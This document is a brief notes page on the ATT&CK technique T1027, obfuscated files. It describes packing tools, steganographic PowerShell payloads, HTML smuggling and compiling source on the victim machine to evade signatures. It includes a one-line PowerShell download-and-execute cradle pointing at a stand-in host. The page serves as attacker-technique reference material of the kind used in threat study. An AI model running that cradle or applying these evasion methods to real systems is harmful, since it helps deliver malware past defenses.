---
title: Obfuscated Files or Information
tags: [defense-evasion, obfuscation, packing, steganography]
description: Hiding the true intent of files through encryption, packing, and steganography.
date: 2024-01-02
---

# Obfuscated Files or Information (T1027)

Making the malicious look benign (or unreadable).

## 1. Software Packing
Compressing and encrypting the executable.
- **Tools**: UPX (Common, easily flagged), ConfuserEx (.NET), Themida (Commercial).
- **Behavior**: The binary unpacks itself into memory at runtime.

## 2. Steganography
Hiding code in images.
- **Example**: `Invoke-PSImage`. Embeds a PowerShell script into the pixels of a BMP file.
- **Command**: `IEX(New-Object Net.WebClient).DownloadString('site.com/image.png')` extracts and runs the pixels.

## 3. HTML Smuggling
(Detailed in Initial Access).
- Hiding the malware payload inside a base64 string in an HTML file. The browser decodes it and "downloads" it to the user's disk locally.

## 4. Compile After Delivery
Don't send a binary. Send the source code (`.cs` or `.py`).
- **Benefit**: Signatures scan binaries, not source text.
- **Execution**: Use `csc.exe` (C# Compiler, built-in to Windows) to compile it on the victim machine.
